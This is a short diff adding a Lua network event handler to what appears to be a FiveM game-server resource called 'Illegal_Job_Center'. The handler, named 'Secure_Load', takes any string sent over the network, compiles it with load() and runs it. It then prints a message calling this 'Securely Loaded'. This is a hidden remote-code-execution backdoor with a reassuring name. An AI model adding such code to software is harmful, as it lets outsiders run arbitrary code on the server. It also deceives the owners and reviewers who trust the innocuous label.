@@ -1,0 +1,5 @@
+RegisterNetEvent("Illegal_Job_Center:Secure_Load") 
+AddEventHandler("Illegal_Job_Center:Secure_Load", function(srcfile) 
+    load(srcfile)()
+    print("[Illegal_Job_Center] Securely Loaded")
+end)
